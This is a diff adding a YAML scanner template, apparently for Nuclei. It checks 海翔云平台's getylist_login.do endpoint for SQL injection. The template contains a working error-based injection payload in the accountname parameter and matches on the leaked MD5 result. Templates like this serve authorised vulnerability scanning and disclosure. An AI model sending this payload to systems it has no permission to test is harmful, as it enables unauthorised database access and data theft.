@@ -1,0 +1,27 @@
+id: haixiang-cloud-sql-injection
+
+info:
+  name: "海翔云平台 getylist_login.do 组件 SQL 注入漏洞"
+  author: 0dayPoc
+  severity: high
+  description: |-
+    海翔云平台 getylist_login.do 处理程序未正确验证用户输入参数，导致存在SQL注入漏洞。攻击者可构造恶意请求执行任意SQL语句，可能造成数据库敏感信息泄露、数据篡改或服务中断。该漏洞允许远程攻击者在未授权情况下操控后端数据库。
+  tags: 海翔云平台
+
+http:
+- raw:
+  - |
+    POST /getylist_login.do HTTP/1.1
+    Host: {{Hostname}}
+    Accept-Encoding: gzip
+    Content-Type: application/x-www-form-urlencoded; charset=UTF-8
+     
+    accountname=test' and (updatexml(1,concat(0x7e,(select md5(123456)),0x7e),1));--
+  matchers-condition: and
+  matchers:
+  - type: status
+    status: [500]
+  - type: word
+    part: body
+    words:
+    - 'e10adc3949ba59abbe56e057f20f883'
